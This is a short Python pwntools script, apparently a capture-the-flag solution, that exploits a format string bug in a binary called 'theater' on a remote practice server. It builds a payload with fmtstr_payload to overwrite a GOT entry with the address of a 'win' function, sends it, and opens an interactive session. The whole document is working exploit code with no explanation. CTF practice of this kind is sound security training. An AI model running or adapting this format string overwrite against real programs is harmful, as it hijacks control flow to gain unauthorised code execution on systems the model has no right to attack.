from pwn import *

# Addresses
win = 0x0000000000401316


# Load the binary
binary = ELF('./theater')
context.binary = binary

# Start the process
p = remote("pwnable.co.il", 9011) #process('./theater')

# Target addresses to overwrite
first_target_address = 0x000000404038#elf.got['printf']#0x00007fffffffd918

# Offset to the first format specifier
fmt_offset = 6

# Prepare the payload for the format string attack
# First, we prepare the payload to overwrite both addresses
payload = fmtstr_payload(fmt_offset, {
    first_target_address: win,    # Overwrite first address with ret
})

# Write the payload to a file
with open('payload', 'wb') as f:
    f.write(payload)

# Send the payload
p.sendline(payload)

# Interact with the process
p.interactive()
